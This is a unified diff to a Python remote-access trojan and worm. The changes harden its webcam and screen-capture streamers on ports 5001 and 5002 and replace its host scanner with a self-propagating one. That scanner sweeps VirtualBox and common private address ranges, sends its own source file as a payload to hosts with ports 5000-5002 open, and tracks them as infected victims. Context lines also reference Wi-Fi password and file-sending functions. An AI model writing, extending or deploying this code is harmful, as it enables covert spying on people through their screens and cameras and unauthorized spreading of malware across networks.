@@ -23,6 +23,9 @@ from PIL import Image
 import queue
 from http.client import HTTPConnection
 import json
+import numpy as np
+import ipaddress
+from threading import Lock
 
 
 def parseargs():
@@ -102,44 +105,74 @@ def wifipass():
 
 
 def retreive_screenshot(conn):
-    with mss.mss() as sct:
-        monitor = sct.monitors[1]  # Chọn toàn bộ màn hình
-        WIDTH, HEIGHT = 600, 300  # Kích thước gửi đi
+    try:
+        with mss.mss() as sct:
+            monitor = sct.monitors[1]
+            WIDTH, HEIGHT = 600, 300
 
-        while True:
-            try:
-                # Chụp màn hình với độ phân giải gốc
-                screenshot = sct.grab(monitor)
+            while True:
+                try:
+                    screenshot = sct.grab(monitor)
+                    img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
+                    img_resized = img.resize((WIDTH, HEIGHT))
+                    
+                    try:
+                        pixels = zlib.compress(img_resized.tobytes())
+                        size = len(pixels)
+                        
+                        # Send in a single block to prevent partial sends
+                        data = ((4).to_bytes(1, byteorder='big') + 
+                               size.to_bytes(4, byteorder='big') + 
+                               pixels)
+                        conn.sendall(data)
+                        
+                        time.sleep(0.033)  # Cap at ~30 FPS
+                        
+                    except ConnectionError:
+                        print("Screen connection lost")
+                        break
+                    except Exception as e:
+                        print(f"Error sending screen: {e}")
+                        break
 
-                # Chuyển ảnh sang định dạng Pillow để resize
-                img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
-                img_resized = img.resize((WIDTH, HEIGHT))  # Resize về 600x300
+                except Exception as e:
+                    print(f"Error capturing screen: {e}")
+                    break
 
-                # Chuyển ảnh đã resize thành bytes và nén
-                pixels = zlib.compress(img_resized.tobytes())
-                size = len(pixels)
-
-                # Gửi kích thước cố định 4 bytes
-                conn.send((4).to_bytes(1, byteorder='big'))  # Always send 4 as size length
-                conn.send(size.to_bytes(4, byteorder='big'))  # Fixed 4 bytes for size
-
-                # Gửi toàn bộ dữ liệu ảnh
-                conn.sendall(pixels)
-
-            except Exception as e:
-                print(f"Error sending screen: {e}")
-                break
+    except Exception as e:
+        print(f"Screen capture error: {e}")
+    finally:
+        try:
+            conn.close()
+        except:
+            pass
 
 
 def screen_sender(host='0.0.0.0', port=5001):
-    with socket.socket() as sock:
-        sock.bind((host, port))
-        sock.listen(5)
-        print('screen sender started.')
-        while True:
-            conn, _ = sock.accept()
-            threadscreen2 = threading.Thread(target=retreive_screenshot, args=(conn,))
-            threadscreen2.start()
+    while True:  # Add outer loop for continuous listening
+        try:
+            with socket.socket() as sock:
+                # Add socket options to allow reuse
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                sock.bind((host, port))
+                sock.listen(5)
+                print('Screen sender started and listening.')
+                
+                while True:
+                    try:
+                        conn, addr = sock.accept()
+                        print(f"Screen client connected from {addr}")
+                        thread = threading.Thread(target=retreive_screenshot, args=(conn,))
+                        thread.daemon = True
+                        thread.start()
+                    except Exception as e:
+                        print(f"Error accepting screen connection: {e}")
+                        break
+                        
+        except Exception as e:
+            print(f"Screen sender error: {e}")
+            
+        time.sleep(1)  # Wait before retrying
 
 
 def handle_client(client_socket):
@@ -174,34 +207,55 @@ def R_tcp(host='0.0.0.0', port=5000):
 def capturevid(conn):
     try:
         cap = cv2.VideoCapture(0)
-        WIDTH, HEIGHT = 600, 300  # Resize kích thước hình ảnh giống như screensender
+        if not cap.isOpened():
+            print("Failed to open camera")
+            # Send error frame
+            error_frame = np.zeros((300, 600, 3), dtype=np.uint8)
+            cv2.putText(error_frame, "Camera Not Available", (150, 150), 
+                       cv2.FONT_HERSHEY_SIMPLEX, 1, (255, 255, 255), 2)
+            compress_img = cv2.imencode('.jpg', error_frame)[1]
+            pixels = zlib.compress(compress_img.tobytes())
+            size = len(pixels)
+            try:
+                conn.send((4).to_bytes(1, byteorder='big'))
+                conn.send(size.to_bytes(4, byteorder='big'))
+                conn.sendall(pixels)
+            except:
+                pass
+            return
+
+        WIDTH, HEIGHT = 600, 300
         while cap.isOpened():
             try:
                 ret, frame = cap.read()
                 if not ret:
-                    print("Failed to capture frame.")
-                    break
+                    # Send error frame on camera failure
+                    error_frame = np.zeros((HEIGHT, WIDTH, 3), dtype=np.uint8)
+                    cv2.putText(error_frame, "Camera Error", (150, 150), 
+                               cv2.FONT_HERSHEY_SIMPLEX, 1, (255, 255, 255), 2)
+                    frame = error_frame
 
                 # Resize frame
                 frame_resized = cv2.resize(frame, (WIDTH, HEIGHT))
 
-                # Nén ảnh
+                # Compress and send
                 compress_img = cv2.imencode('.jpg', frame_resized)[1]
                 pixels = zlib.compress(compress_img.tobytes())
                 size = len(pixels)
 
-                # Gửi kích thước cố định 4 bytes
-                conn.send((4).to_bytes(1, byteorder='big'))  # Always send 4 as size length
-                conn.send(size.to_bytes(4, byteorder='big'))  # Fixed 4 bytes for size
+                try:
+                    conn.send((4).to_bytes(1, byteorder='big'))
+                    conn.send(size.to_bytes(4, byteorder='big'))
+                    conn.sendall(pixels)
+                except ConnectionError:
+                    print("Connection lost")
+                    break
+                except Exception as e:
+                    print(f"Error sending frame: {e}")
+                    break
 
-                # Gửi toàn bộ dữ liệu ảnh
-                conn.sendall(pixels)
-
-            except ConnectionError:
-                print("Connection lost")
-                break
             except Exception as e:
-                print(f"Error sending frame segment: {e}")
+                print(f"Error capturing frame: {e}")
                 break
 
     except Exception as e:
@@ -209,23 +263,38 @@ def capturevid(conn):
     finally:
         if 'cap' in locals():
             cap.release()
-        cv2.destroyAllWindows()
         try:
             conn.close()
-        except Exception as e:
-            print(f"Error closing connection: {e}")
+        except:
+            pass
 
 
 def camsender(port=5002):
     host = "0.0.0.0"
-    with socket.socket() as sock:
-        sock.bind((host, port))
-        sock.listen(5)
-        print('camera sender started.')
-        while True:
-            conn, _ = sock.accept()
-            thread = threading.Thread(target=capturevid, args=(conn,))
-            thread.start()
+    while True:  # Add outer loop for continuous listening
+        try:
+            with socket.socket() as sock:
+                # Add socket options to allow reuse
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                sock.bind((host, port))
+                sock.listen(5)
+                print('Camera sender started and listening.')
+                
+                while True:
+                    try:
+                        conn, addr = sock.accept()
+                        print(f"Camera client connected from {addr}")
+                        thread = threading.Thread(target=capturevid, args=(conn,))
+                        thread.daemon = True  # Make thread daemon
+                        thread.start()
+                    except Exception as e:
+                        print(f"Error accepting camera connection: {e}")
+                        break
+                        
+        except Exception as e:
+            print(f"Camera sender error: {e}")
+        
+        time.sleep(1)  # Wait before retrying
 
 
 def send_file(conn, file_path):
@@ -246,97 +315,122 @@ def send_file(conn, file_path):
 
 
 class NetworkScanner:
-    def __init__(self, middleman_host, middleman_port):
-        self.vulnerable_hosts = queue.Queue()
-        self.target_ports = [5000, 5001, 5002]
-        self.middleman_host = middleman_host
-        self.middleman_port = middleman_port
-        # Focus on most likely VM network ranges
-        self.network_ranges = [
-            "10.0.2",     # VirtualBox default NAT
-            "192.168.56", # VirtualBox default Host-only
+    def __init__(self):
+        self.victims = set()
+        self.known_victims = set()
+        self.lock = Lock()
+        self.running = True
+        
+        # Mở rộng các dải mạng VirtualBox phổ biến
+        self.virtualbox_networks = [
+            '10.0.2.0/24',     # NAT default
+            '192.168.56.0/24', # Host-only default
+            '192.168.0.0/24',  # Bridge mode common range
+            '192.168.1.0/24',  # Bridge mode common range
+            '192.168.2.0/24',  # Bridge mode common range
+            '10.0.3.0/24',     # NAT Network common range
+            '172.16.0.0/16',   # Custom range
+            '172.17.0.0/16',   # Custom range
+            '172.18.0.0/16'    # Custom range
         ]
-        print(f"Scanner initialized with middleman: {middleman_host}:{middleman_port}")
+        
+        self.target_ports = [5000, 5001, 5002]
+        self.payload = None
+        self.load_payload()
 
-    def notify_middleman(self, new_host):
+    def load_payload(self):
+        """Load the current file as payload"""
         try:
-            print(f"Attempting to notify middleman about host: {new_host}")
-            conn = HTTPConnection(self.middleman_host, self.middleman_port)
-            headers = {'Content-type': 'application/json'}
-            data = json.dumps({'new_host': new_host})
-            conn.request('POST', '/new_host', data, headers)
-            response = conn.getresponse()
-            print(f"Middleman response: {response.status}")
-            conn.close()
+            with open(__file__, 'rb') as f:
+                self.payload = f.read()
         except Exception as e:
-            print(f"Failed to notify middleman: {e}")
+            print(f"Failed to load payload: {e}")
 
-    def scan_port(self, host, port):
+    def scan_port(self, host, port, timeout=0.1):  # Giảm timeout để quét nhanh hơn
+        """Check if a port is open"""
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.5)  # Shorter timeout for faster scanning
-            result = sock.connect_ex((host, port))
-            sock.close()
-            if result == 0:
-                print(f"Port {port} is open on {host}")
-            return result == 0
-        except Exception as e:
-            print(f"Error scanning {host}:{port} - {e}")
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(timeout)
+                result = s.connect_ex((host, port))
+                return result == 0
+        except:
             return False
 
-    def scan_networks(self):
-        """Scan multiple network ranges."""
-        active_threads = []
-        max_threads = 20  # Limit concurrent threads
-        
-        for base_ip in self.network_ranges:
-            print(f"Scanning network range: {base_ip}.0/24")
-            for i in range(1, 255):
-                host = f"{base_ip}.{i}"
-                
-                # Clean up completed threads
-                active_threads = [t for t in active_threads if t.is_alive()]
-                
-                # Wait if too many threads
-                while len(active_threads) >= max_threads:
-                    time.sleep(0.1)
-                    active_threads = [t for t in active_threads if t.is_alive()]
-                
-                thread = threading.Thread(target=self.scan_host, args=(host,))
-                thread.daemon = True
-                thread.start()
-                active_threads.append(thread)
-            
-            # Wait for all threads in this range to complete
-            for t in active_threads:
-                t.join()
-
-    def scan_host(self, host):
+    def spread_to_host(self, host):
+        """Attempt to spread payload to a vulnerable host"""
         try:
-            # Quick check for first port
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.2)  # Very short timeout
-            result = sock.connect_ex((host, self.target_ports[0]))
-            sock.close()
-            
-            if result == 0:
-                print(f"Found potential host: {host}")
-                # Check other ports
-                for port in self.target_ports[1:]:
-                    if self.scan_port(host, port):
-                        print(f"Found vulnerable host: {host} with port {port} open")
-                        self.vulnerable_hosts.put((host, port))
-                        self.notify_middleman(host)
-                        break
-        except:
-            pass
+            # Try to connect and send payload
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(3)
+                s.connect((host, self.target_ports[0]))
+                
+                if self.payload:
+                    # Send payload size
+                    size = len(self.payload)
+                    s.send(size.to_bytes(4, byteorder='big'))
+                    
+                    # Send payload
+                    s.sendall(self.payload)
+                    
+                    print(f"Successfully spread to {host}")
+                    return True
+                    
+        except Exception as e:
+            print(f"Failed to spread to {host}: {e}")
+        return False
 
-    def get_vulnerable_hosts(self):
-        """Return list of vulnerable hosts found."""
-        hosts = []
-        while not self.vulnerable_hosts.empty():
-            hosts.append(self.vulnerable_hosts.get())
-        return hosts
+    def scan_network(self):
+        """Scan networks for potential victims"""
+        while self.running:
+            for network in self.virtualbox_networks:
+                try:
+                    network_addr = ipaddress.IPv4Network(network)
+                    print(f"Scanning network: {network}")
+                    
+                    # Scan each host in network
+                    for ip in network_addr.hosts():
+                        host = str(ip)
+                        
+                        # Skip if already a known victim
+                        if host in self.known_victims:
+                            continue
+
+                        # Quick check for first port
+                        if self.scan_port(host, self.target_ports[0]):
+                            print(f"Found potential target: {host}")
+                            
+                            # Check all required ports
+                            all_ports_open = True
+                            for port in self.target_ports[1:]:
+                                if not self.scan_port(host, port):
+                                    all_ports_open = False
+                                    break
+                            
+                            if all_ports_open:
+                                print(f"Found vulnerable host: {host}")
+                                # Try to spread
+                                if self.spread_to_host(host):
+                                    with self.lock:
+                                        self.victims.add(host)
+                                        self.known_victims.add(host)
+                                        print(f"Successfully infected {host}")
+
+                except Exception as e:
+                    print(f"Error scanning network {network}: {e}")
+
+            time.sleep(10)  # Quét lại sau mỗi 10 giây
+
+    def start(self):
+        """Start scanning in background thread"""
+        self.scan_thread = threading.Thread(target=self.scan_network, daemon=True)
+        self.scan_thread.start()
+
+    def stop(self):
+        """Stop scanning"""
+        self.running = False
+        if hasattr(self, 'scan_thread'):
+            self.scan_thread.join(timeout=1.0)
+
 
 def spread_payload(target_host, target_port):
     """Attempt to spread the payload to a vulnerable host."""
@@ -345,41 +439,43 @@ def spread_payload(target_host, target_port):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.settimeout(3)
             s.connect((target_host, target_port))
-            
+
             # Get our own file content
             with open(__file__, 'rb') as f:
                 payload = f.read()
-            
+
             # Send payload size first
             size = len(payload)
             s.send(size.to_bytes(4, byteorder='big'))
-            
+
             # Send the payload
             s.sendall(payload)
-            
+
             print(f"Successfully spread to {target_host}:{target_port}")
-            
+
     except Exception as e:
         print(f"Failed to spread to {target_host}:{target_port}: {e}")
 
+
 def start_spreading():
     print("Starting network scanner...")
-    scanner = NetworkScanner(middleman_host="10.0.2.15", middleman_port=8080)
-    
+    scanner = NetworkScanner()
+    scanner.start()
+
     while True:
         try:
-            scanner.scan_networks()
-            vulnerable_hosts = scanner.get_vulnerable_hosts()
-            
-            for host, port in vulnerable_hosts:
+            scanner.scan_network()
+            vulnerable_hosts = scanner.victims
+
+            for host in vulnerable_hosts:
                 threading.Thread(
                     target=spread_payload,
-                    args=(host, port),
+                    args=(host, 5000),
                     daemon=True
                 ).start()
-            
+
             time.sleep(10)  # Shorter delay between scans
-            
+
         except Exception as e:
             print(f"Error in spreading routine: {e}")
             time.sleep(5)
